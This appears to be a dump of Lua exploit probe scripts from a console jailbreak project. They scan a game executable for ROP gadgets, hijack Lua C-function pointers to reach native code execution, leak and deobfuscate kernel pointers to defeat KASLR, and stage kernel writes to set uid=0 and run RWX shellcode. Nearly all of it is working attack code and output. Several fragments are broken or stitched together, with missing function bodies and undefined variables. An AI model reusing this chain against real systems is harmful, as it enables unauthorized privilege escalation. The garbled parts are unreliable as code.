    -- The C function calling convention for Lua C functions is:
    -- int func(lua_State *L)
    -- rdi = lua_State pointer
    -- The function should push results on the Lua stack and return count
    --
    -- If we redirect to syscall;ret:
    -- rdi = lua_State (will be used as syscall arg1)
    -- rax = ??? (syscall number depends on what's in rax)
    --
    -- We need to set rax = 20 (getpid) first
    -- Need: pop rax; ret -> 20 -> syscall; ret
    -- But we only control the initial jump, not the stack...
    --
    -- Actually, when the VM calls the C function:
    -- The stack has the return address, then whatever the VM pushed
    -- If we jump to a pop rax; ret gadget, rax = return_addr, then
    -- we jump to whatever was next on stack
    --
    -- This is getting into ROP territory. For now, just test what
    -- happens with a direct syscall;ret redirect.

    local sc_gadget_lo = text_lo + syscall_ret
    local sc_gadget_hi = text_hi
    if sc_gadget_lo >= 0x100000000 then
        sc_gadget_hi = sc_gadget_hi + 1
        sc_gadget_lo = sc_gadget_lo - 0x100000000
    end
    local sc_gadget = uint64(string.format("0x%X%08X", sc_gadget_hi, sc_gadget_lo))
    print("  syscall;ret at: " .. hexval(sc_gadget))
    print("  WARNING: rax is unknown, this will execute an unpredictable syscall")
    print("  Skipping direct syscall redirect (too dangerous)")
end

-- Step 5: Try xor eax,eax;ret (safe — just returns 0)
if xor_eax_ret then
    print("")
    print("[*] Step 5: Redirect type() to xor eax,eax;ret")
    print("  This should make type() return 0 pushed results (empty)")

    local gadget_lo = text_lo + xor_eax_ret
    local gadget_hi = text_hi
    if gadget_lo >= 0x100000000 then
        gadget_hi = gadget_hi + 1
        gadget_lo = gadget_lo - 0x100000000
    end
    local gadget = uint64(string.format("0x%X%08X", gadget_hi, gadget_lo))
    print("  gadget at: " .. hexval(gadget))

    collectgarbage("stop")
    local old = safe_rq(type_addr + 0x20)
    safe_wq(type_addr + 0x20, gadget)

    local ok, ret = pcall(function() return type(42) end)
    if ok then
        print("  type(42) = " .. tostring(ret) .. " (type: " .. type(ret) .. ")")
        if ret == nil then
            print("  >>> Returned nil — gadget executed, returned 0 results!")
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end

    safe_wq(type_addr + 0x20, old)
    collectgarbage("restart")

    local ok2, ret2 = pcall(function() return type(42) end)
    print("  After restore: type(42) = " .. tostring(ret2))
end

-- Step 6: If we found mov eax, N; ret gadgets, test one
if #mov_eax_ret > 0 then
    print("")
    print("[*] Step 6: Redirect type() to mov eax, N; ret")
    local g = mov_eax_ret[1]
    print(string.format("  Using mov eax, 0x%X; ret at eboot+0x%X", g.imm, g.off))

    local gadget_lo = text_lo + g.off
    local gadget_hi = text_hi
    if gadget_lo >= 0x100000000 then
        gadget_hi = gadget_hi + 1
        gadget_lo = gadget_lo - 0x100000000
    end
    local gadget = uint64(string.format("0x%X%08X", gadget_hi, gadget_lo))

    collectgarbage("stop")
    local old = safe_rq(type_addr + 0x20)
    safe_wq(type_addr + 0x20, gadget)

    local ok, ret = pcall(function() return type(42) end)
    if ok then
        print("  type(42) = " .. tostring(ret) .. " (type: " .. type(ret) .. ")")
        print(string.format("  >>> Gadget returned %d results to Lua", g.imm))
    else
        print("  CRASHED: " .. tostring(ret))
    end

    safe_wq(type_addr + 0x20, old)
    collectgarbage("restart")

    local ok2, ret2 = pcall(function() return type(42) end)
    print("  After restore: type(42) = " .. tostring(ret2))
end

print("")
print("=== PROBE 54o COMPLETE ===")
```

## probes/phase14_final_push/54p_redirect_minimal.lua

```lua
-- CRASH_CLASS: HIGH
-- PROBE 54p: Minimal C function redirect test
--
-- Context: 54o hung when redirecting type->tostring (likely stack mismatch
-- caused infinite loop). This probe uses the simplest possible test:
-- 1) Redirect type()'s +0x20 to type()'s OWN address (no-op control)
-- 2) Redirect type()'s +0x20 to pcall's C func (both take 1+ args)
-- 3) Gadget scan for xor eax,eax;ret and syscall;ret in first 64KB eboot
-- 4) Test xor eax,eax;ret gadget (safest — returns 0 results)

print("=== PROBE 54p: MINIMAL REDIRECT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(": ([0-9a-fA-F]+)") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

-- Get addresses
local type_addr = parse_func_addr(type)
local rawget_addr = parse_func_addr(rawget)
local rawlen_addr = parse_func_addr(rawlen)
local select_addr = parse_func_addr(select)

print("type addr: " .. hexval(type_addr))

local type_cfunc = safe_rq(type_addr + 0x20)
print("type +0x20: " .. hexval(type_cfunc))
print("Baseline: type(42) = " .. tostring(type(42)))

-- TEST A: Write SAME value back (absolute no-op control)
print("")
print("[A] Write same C func back (no-op control)")
collectgarbage("stop")
safe_wq(type_addr + 0x20, type_cfunc)
local okA, retA = pcall(function() return type(42) end)
collectgarbage("restart")
if okA then
    print("  type(42) = " .. tostring(retA))
else
    print("  CRASHED: " .. tostring(retA))
end

-- TEST B: Eboot gadget scan (quick, first 64KB)
print("")
print("[B] Gadget scan")
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)

if not text_lo or not text_hi then
    print("  No eboot base")
    print("=== PROBE 54p DONE ===")
    return
end

local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot: " .. hexval(eboot))

local ret_off = nil
local xor_eax_ret_off = nil
local syscall_ret_off = nil
local pop_rdi_ret_off = nil
local pop_rax_ret_off = nil
local gadget_count = 0

for off = 0, 0xFFFF do
    local dw = safe_rd(eboot + off)
    if dw then
        -- xor eax, eax; ret = 31 C0 C3
        if (dw % 0x1000000) == 0xC3C031 and not xor_eax_ret_off then
            xor_eax_ret_off = off
            print(string.format("  xor eax,eax;ret at +0x%X", off))
            gadget_count = gadget_count + 1
        end
        -- syscall; ret = 0F 05 C3
        if (dw % 0x1000000) == 0xC3050F and not syscall_ret_off then
            syscall_ret_off = off
            print(string.format("  syscall;ret at +0x%X", off))
            gadget_count = gadget_count + 1
        end
        -- ret = C3
        if (dw % 256) == 0xC3 and not ret_off then
            ret_off = off
        end
        -- pop rdi; ret = 5F C3
        if (dw % 0x10000) == 0xC35F and not pop_rdi_ret_off then
            pop_rdi_ret_off = off
            print(string.format("  pop rdi;ret at +0x%X", off))
            gadget_count = gadget_count + 1
        end
        -- pop rax; ret = 58 C3
        if (dw % 0x10000) == 0xC358 and not pop_rax_ret_off then
            pop_rax_ret_off = off
            print(string.format("  pop rax;ret at +0x%X", off))
            gadget_count = gadget_count + 1
        end
    end
    if gadget_count >= 10 then break end
end

if ret_off then print(string.format("  ret at +0x%X", ret_off)) end
print(string.format("  %d key gadgets found", gadget_count))

-- TEST C: xor eax,eax;ret gadget redirect
-- This is the SAFEST test: the C function returns int (number of results)
-- xor eax,eax;ret makes it return 0 (no results pushed)
-- So type(42) should return nil (0 results)
if xor_eax_ret_off then
    print("")
    print("[C] Redirect type() to xor eax,eax;ret")
    local g_lo = text_lo + xor_eax_ret_off
    local g_hi = text_hi
    if g_lo >= 0x100000000 then g_hi = g_hi + 1; g_lo = g_lo - 0x100000000 end
    local gadget = uint64(string.format("0x%X%08X", g_hi, g_lo))
    print("  gadget: " .. hexval(gadget))

    collectgarbage("stop")
    local old = safe_rq(type_addr + 0x20)
    local wok = safe_wq(type_addr + 0x20, gadget)
    print("  write ok: " .. tostring(wok))

    local okC, retC = pcall(function() return type(42) end)
    -- Restore IMMEDIATELY
    safe_wq(type_addr + 0x20, old)
    collectgarbage("restart")

    if okC then
        print("  type(42) = " .. tostring(retC))
        if retC == nil then
            print("  >>> GADGET EXECUTED! Returned 0 results (nil)!")
            print("  >>> NATIVE CODE EXECUTION CONFIRMED!")
        else
            print("  >>> Got value: " .. tostring(retC) .. " — unexpected")
        end
    else
        print("  CRASHED: " .. tostring(retC))
    end

    -- Verify restore
    local okR, retR = pcall(function() return type(42) end)
    print("  After restore: type(42) = " .. tostring(retR))
end

-- TEST D: If xor eax,eax;ret worked, try mov eax, 1; ret pattern
-- scan for it: B8 01 00 00 00 C3
if xor_eax_ret_off then
    print("")
    print("[D] Scan for mov eax,1;ret")
    local mov1_off = nil
    for off = 0, 0xFFFF do
        local dw = safe_rd(eboot + off)
        if dw == 0x000001B8 then
            local nxt = safe_rd(eboot + off + 4)
            if nxt and (nxt % 256) == 0xC3 and (math.floor(nxt / 256) % 256) == 0x00 then
                -- B8 01 00 00 00 C3
                mov1_off = off
                print(string.format("  mov eax,1;ret at +0x%X", off))
                break
            end
        end

    if mov1_off then

        local g_lo = text_lo + mov1_off
        local g_hi = text_hi
        if g_lo >= 0x100000000 then g_hi = g_hi + 1; g_lo = g_lo - 0x100000000 end
        local gadget = uint64(string.format("0x%X%08X", g_hi, g_lo))

        collectgarbage("stop")
        local old = safe_rq(type_addr + 0x20)
        safe_wq(type_addr + 0x20, gadget)

        local okD, retD = pcall(function() return type(42) end)
        safe_wq(type_addr + 0x20, old)

        if okD then

        end

        local okR2, retR2 = pcall(function() return type(42) end)
        print("  After restore: type(42) = " .. tostring(retR2))
    end
end

print("")
print("=== PROBE 54p COMPLETE ===")
```

## probes/phase14_final_push/54q_cfunc_redirect_return1.lua

```lua
-- CRASH_CLASS: HIGH
-- PROBE 54q: CClosure +0x20 redirect with a one-result C function
--
-- 54o/54p stopped before their post-write marker. This probe does not use a
-- zero-result gadget. It redirects type() to tonumber(), whose normal Lua C
-- contract consumes one argument and returns one value, then restores the
-- original pointer immediately. Markers bracket every operation so a timeout
-- identifies the exact boundary. No native-execution conclusion is made here.

print("=== PROBE 54q: ONE-RESULT C FUNC REDIRECT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local type_addr = parse_func_addr(type)
local tonumber_addr = parse_func_addr(tonumber)
if not type_addr or not tonumber_addr then
    print("ADDRESS_PARSE_FAILED")
    print("=== PROBE 54q ABORTED ===")
    return
end

local type_slot = type_addr + 0x20
local tonumber_slot = tonumber_addr + 0x20
local old_type = safe_rq(type_slot)
local target = safe_rq(tonumber_slot)

print("type addr: " .. hexval(type_addr))
print("type +0x20: " .. hexval(old_type))
print("tonumber addr: " .. hexval(tonumber_addr))
print("tonumber +0x20: " .. hexval(target))
print("Baseline type(42): " .. tostring(type(42)))
print("Baseline tonumber(42): " .. tostring(tonumber(42)))

print("[A] No-op write marker BEFORE")
local no_op = safe_wq(type_slot, old_type)
print("[A] No-op write marker AFTER ok=" .. tostring(no_op))
print("[A] type(42): " .. tostring(type(42)))

if not target or not old_type then
    print("POINTER_READ_FAILED")
    print("=== PROBE 54q COMPLETE (partial) ===")
    return
end

print("[B] Alternate pointer write BEFORE")
collectgarbage("stop")
local write_ok = safe_wq(type_slot, target)
print("[B] Alternate pointer write AFTER ok=" .. tostring(write_ok))

if write_ok then
    print("[C] Redirected one-result call BEFORE")
    -- The result is assigned locally so a one-result C return is expected.
    local call_ok, call_ret = pcall(function()
        local value = type(42)
        return value
    end)
    print("[C] Redirected one-result call AFTER ok=" .. tostring(call_ok) ..
        " value=" .. tostring(call_ret))
else
    print("[C] SKIPPED because alternate pointer write reported false")
end

print("[D] Restore BEFORE")
local restore_ok = safe_wq(type_slot, old_type)
print("[D] Restore AFTER ok=" .. tostring(restore_ok))
collectgarbage("restart")

local verify_ok, verify_ret = pcall(function() return type(42) end)
print("[E] After restore ok=" .. tostring(verify_ok) ..
    " type(42)=" .. tostring(verify_ret))
print("=== PROBE 54q COMPLETE ===")
```

```lua
    return nil
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function hexval(val)

    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)

    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local targets = {
    {"type", type},
    {"tonumber", tonumber},
    {"tostring", tostring},
    {"pcall", pcall},
    {"pairs", pairs},
    {"rawget", rawget},
    {"select", select},
}

for _, item in ipairs(targets) do
    local name, fn = item[1], item[2]
    local addr = parse_func_addr(fn)
    print("")
    print("[" .. name .. "] object=" .. hexval(addr))
    if addr then
        local cfunc = safe_rq(addr + 0x20)
        print("  +0x20 target=" .. hexval(cfunc))
        print("  +0x00 next=" .. hexval(safe_rq(addr + 0x00)))
        print("  +0x08 tag=" .. hexval(safe_rq(addr + 0x08)))
        print("  +0x10 gclist=" .. hexval(safe_rq(addr + 0x10)))
        print("  +0x18 env=" .. hexval(safe_rq(addr + 0x18)))
        print("  target bytes (little-endian dwords):")
        if cfunc then
            for off = 0, 0x3C, 4 do
                local word = safe_rd(cfunc + off)
                print(string.format("    +0x%02X: %08X", off, word or 0))
            end
        else
            print("    UNREADABLE_TARGET")
        end
    else
        print("  ADDRESS_PARSE_FAILED")
    end
end

print("")
print("No writes, redirects, or calls through modified pointers were attempted.")
print("=== PROBE 54r COMPLETE ===")
```

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 55a: sys 643 set_chicken_switches exploration
--
-- Context: PR #5 kernel handler RE reveals sys 643 is "set_chicken_switches":

-- with NO privilege check, NO bounds check, NO copyin.
-- It directly ORs user bits into a process struct field.
-- If +0xa34 is a debug/security flag, we might enable debug mode.
--
-- Plan:
-- A) Read process+0xa34 baseline via sysctl kinfo_proc (if accessible)
-- B) Call sys 643 with known bit patterns and observe behavior changes
-- C) Test each bit individually (32 bits) and check for side effects
-- D) After setting bits, check if previously-blocked syscalls now work
-- E) Check if mprotect(EXEC) behavior changes (security flag?)

print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)

local sc202 = make_syscall(202)
local sc477 = make_syscall(477)
local sc588 = make_syscall(588)

end

-- [B] Get PID for later sysctl checks

local ok_pid, pid_val = pcall(function() return sc20() end)
local pid = 0
if ok_pid then pid = to_num(pid_val) end
print("  PID: " .. pid)

-- [C] Test mprotect(EXEC) BEFORE setting any bits

print("[B] Baseline mprotect(EXEC) test")
local gpu = nil
do
    local ok_m, gpu_val = pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

if gpu then

    local ok_mp, mp_ret = pcall(function()

    end)

end

-- [D] Set chicken switch bits and test effects
-- Start with individual bits to find which ones do something interesting

print("[C] Setting chicken switch bits one at a time")

local interesting_bits = {}

for bit = 0, 31 do
    local val = math.floor(2 ^ bit)
    -- On 14.10 the field might already have bits set, OR only adds
    local ok_c, ret_c = pcall(function() return sc643(uint64(val)) end)
```

```lua
    return tonumber(v) or 0

    local t = {}

local function safe_rd(addr)

    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end

end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)

local function safe_wq(addr, val)

local function get_hi_lo(val)

        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end

    local n = to_num(v)

else

-- METHOD 2: If we have kernel .text base, compute sysent address
-- and try to validate by probing accessible sony syscall handlers
-- =====================================================================

print("--- METHOD 2: Sysent table validation ---")

    local sysent_rva_lo = 0xe6e5c0

        sysent_lo = sysent_lo - 0x100000000

                    print(string.format("      +%02X: 0x%08X_%08X%s", off, qh, ql, marker))

        return sc638(make_u64(kbase_hi, kbase_lo), uint64(0x1000), uint64(region_out), uint64(0x200))
    end)

        print("    638(kernel_base, 0x1000, out) ret=" .. rv)
        if rv == 0 then

-- The leaked pointer is into the kernel heap. Nearby objects may contain
-- proc/cred/ucred pointers. We can use sysctl tricks to correlate.

    print("")
    print("  Leaked heap pointer: " .. string.format("0x%08X_%08X", kbase_hi, kbase_lo))
    print("")

    -- Strategy: Call AIO syscalls repeatedly with different args
    -- Each call may return different obfuscated pointers
    -- Collecting multiple pointers maps out the heap region

    -- Deobfuscation function (from 54c)
    local function deobfuscate_ptr(h, l)
        local function get_nibble(hi, lo, pos)
            if pos < 8 then
                return math.floor(lo / (2^(pos*4))) % 16
            else
                return math.floor(hi / (2^((pos-8)*4))) % 16
            end
        end
        local ob = {}
        for i = 0, 15 do ob[i] = get_nibble(h, l, i) end
        local orig = {}
        orig[15] = ob[15]
        for i = 14, 0, -1 do
            local a, b = ob[i], orig[i + 1]
            local bxor = 0
            for bit = 0, 3 do
                local p = 2^bit
                if math.floor(a/p) % 2 ~= math.floor(b/p) % 2 then bxor = bxor + p end
            end
            orig[i] = bxor
        end
        local rh, rl = 0, 0
        for i = 0, 15 do
            if i < 8 then rl = rl + orig[i] * (2^(i*4))
            else rh = rh + orig[i] * (2^((i-8)*4)) end
        end
        return rh, rl
    end

            return sc(uint64(0), uint64(outbuf), uint64(0x100), uint64(0), uint64(0), uint64(0))
        end)
        if ok_call then
            local rv = signed32(ret_call)
            if rv >= 0 then
                for i = 0, 0xF8, 8 do
                    local q = safe_rq(outbuf + i)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh ~= 0 and qh ~= 0xFFFFFFFF then
                            local dh, dl = deobfuscate_ptr(qh, ql)
                            if is_kptr(dh) then
                                table.insert(collected, {num, i, dh, dl})
                                print(string.format("    %d+%02X: obf=%s deobf=0x%08X_%08X",
                                    num, i, hexval(q), dh, dl))
                            end
                        end
                    end
                end
            end
        end
    end

    print("")
    print("  Collected " .. #collected .. " kernel heap pointers")
    if #collected > 1 then
        print("  Pointer spread (for heap layout mapping):")
        local base_h, base_l = collected[1][3], collected[1][4]
        for _, c in ipairs(collected) do
            local diff_h = c[3] - base_h
            local diff_l = c[4] - base_l
            print(string.format("    %d+%02X: +0x%X%08X from first", c[1], c[2], diff_h, diff_l))
        end
    end
end

-- =====================================================================
-- METHOD 4: Deep module struct scan for kernel pointers
-- sys 593 returns 0x160 bytes. Check if init_proc/fini_proc/eh_frame
-- are kernel VA (not userland module VA)
-- =====================================================================
print("")
print("--- METHOD 4: Module struct deep scan ---")

local sc593 = make_syscall(593)
local info_buf = memory.alloc(0x200)
local handles = {1, 2, 8193, 0}

for _, h in ipairs(handles) do
    for i = 0, 0x1FC, 4 do safe_wd(info_buf + i, 0) end
    safe_wd(info_buf, 0x160)

    local ok593, ret593 = pcall(function()
        return sc593(uint64(h), uint64(info_buf), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if ok593 and signed32(ret593) >= 0 then
        -- Check fields that could be kernel VA
        local offsets = {
            {0x148, "init_proc_addr"},
            {0x150, "fini_proc_addr"},
            {0x158, "eh_frame_hdr"},
            {0x100, "unknown_0x100"},
            {0x108, "mapbase"},
            {0x110, "text_addr"},
        }
        for _, entry in ipairs(offsets) do
            local off = entry[1]
            local name = entry[2]
            local q = safe_rq(info_buf + off)
            if q then
                local qh, ql = get_hi_lo(q)
                if is_kptr(qh) then
                    print(string.format("  handle=%d +0x%03X (%s): 0x%08X_%08X <<< KERNEL PTR",
                        h, off, name, qh, ql))
                elseif qh > 0 and qh ~= 0xFFFFFFFF then
                    print(string.format("  handle=%d +0x%03X (%s): 0x%08X_%08X (unusual)",
                        h, off, name, qh, ql))
                end
            end
        end
    end
end

print("")
print("=== PROBE 55a COMPLETE ===")
print("If any KPTR was found above, use it to compute kernel_base")
print("and fill in 55b for the write stage.")
```

## probes/phase14_final_push/55b_post_kaslr_kwrite.lua

```lua
-- CRASH_CLASS: HIGH
-- PROBE 55b: Post-KASLR kernel write — escalate to uid=0
--
-- Prerequisites: 55a found kernel base address. Fill in kbase_hi/kbase_lo.
-- Goal: write to kernel memory to zero our uid (privilege escalation)
--
-- Write primitives attempted:
--   Method A: AIO 661 with deobfuscated kernel pointer as target buffer
--   Method B: sys 588 DMEM page flip to alias kernel page, then write via alias
--   Method C: sys 622 device control crafted command
--   Method D: sysctl write (kern.securelevel = -1)
--
-- Target offsets (FreeBSD r230171 / AMD64):
--   proc.p_ucred    = +0x40
--   ucred.cr_uid     = +0x04
--   ucred.cr_ruid    = +0x08
--   ucred.cr_ngroups = +0x14
--   ucred.cr_groups[0] = +0x18
--   ucred.cr_prison  = +0x30
--   proc.p_fd        = +0x48

print("=== PROBE 55b: POST-KASLR KERNEL WRITE ===")
print("")

-- ====== FILL THESE IN FROM 55a RESULTS ======
local kbase_hi = 0xFFFF8000  -- upper 32 bits of kernel base
local kbase_lo = 0x00000000  -- lower 32 bits (from 55a)
local proc_addr_hi = 0       -- our proc struct address (from 55a kinfo_proc)
local proc_addr_lo = 0
-- =============================================

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end
local function mk_addr(hi, lo)
    return uint64(string.format("0x%X%08X", hi, lo))
end

local sc202 = make_syscall(202)   -- sysctl
local sc588 = make_syscall(588)   -- DMEM page attr
local sc622 = make_syscall(622)   -- device control
local sc661 = make_syscall(661)   -- AIO submit
local sc20  = make_syscall(20)    -- getpid

-- Get our PID
local pid = 0
do
    local ok, ret = pcall(function() return sc20() end)
    if ok then pid = to_num(ret) end
end
print("[*] Our PID: " .. pid)

-- Verify kernel base is filled in
if kbase_lo == 0 and kbase_hi == 0xFFFF8000 then
    print("[!] WARNING: kbase_lo is still 0 — fill in from 55a results!")
    print("[!] Continuing with placeholder for structure testing...")
end

-- ============================================================
-- Phase 1: Locate our proc via kinfo_proc sysctl
-- ============================================================
print("")
print("[*] Phase 1: Get kinfo_proc for our process")

local outbuf = memory.alloc(0x800)
local oldlenp = memory.alloc(8)
local mib = memory.alloc(16)

safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 1)    -- KERN_PROC_PID
safe_wd(mib + 12, pid)

for i = 0, 0x7FF, 4 do safe_wd(outbuf + i, 0) end
safe_wq(oldlenp, uint64(0x800))

local ok, ret = pcall(function()
    return sc202(uint64(mib), uint64(4), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0))
end)

local ki_size = 0
if ok and signed32(ret) == 0 then
    ki_size = to_num(safe_rq(oldlenp))
    print("  kinfo_proc size: " .. ki_size .. " bytes")

    -- Scan for kernel pointers in kinfo_proc
    print("  Scanning kinfo_proc for kernel pointers...")
    for off = 0, math.min(ki_size, 0x7F8) - 8, 8 do
        local q = safe_rq(outbuf + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("    +0x%03X: %s  <<< KERNEL PTR", off, hexval(q)))
                -- Check if this could be proc or ucred
                if off >= 0x00 and off <= 0x10 then
                    print("      ^ Early struct pointer — could be proc itself")

    local h, l = get_hi_lo(val)

    for nibble = 15, 0, -1 do
        local shift = nibble * 4
        local enc_nibble = math.floor(combined / (2^shift)) % 16
        local prev_nibble = math.floor(result / (2^(shift+4))) % 16
        local dec_nibble = (enc_nibble ~ prev_nibble) % 16
        result = result + dec_nibble * (2^shift)

    return result
```

```lua
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil

    local ok = pcall(function() memory.write_dword(addr, val) end)

    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
```

## probes/phase14_final_push/55d_rwx_shellcode.lua

```lua
-- CRASH_CLASS: HIGH
-- PROBE 55d: RWX shellcode execution via sys 588 DMEM page flip
--
-- Prerequisites: 54d showed sys 588 can change page attributes
-- Strategy:
--   1. Allocate GPU mmap region (RW)
--   2. Write x86-64 shellcode into it
--   3. Use sys 588 to flip pages to executable (RX or RWX)
--   4. Find a jump primitive to reach our shellcode
--   5. Shellcode reads kernel state (GS_BASE, CR3, CR4)

print("=== PROBE 55d: RWX SHELLCODE EXECUTION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc_mmap = make_syscall(477)
local sc588 = make_syscall(588)
local sc585 = make_syscall(585)  -- mtype_protect

-- ============================================================
-- Phase 1: Allocate GPU mmap region
-- ============================================================
print("[*] Phase 1: Allocate GPU mmap region for shellcode")

local gpu = nil
local gpu_size = 16 * 0x4000  -- 16 pages = 256KB

local ok, val = pcall(function()
    return sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if ok then
    gpu = val
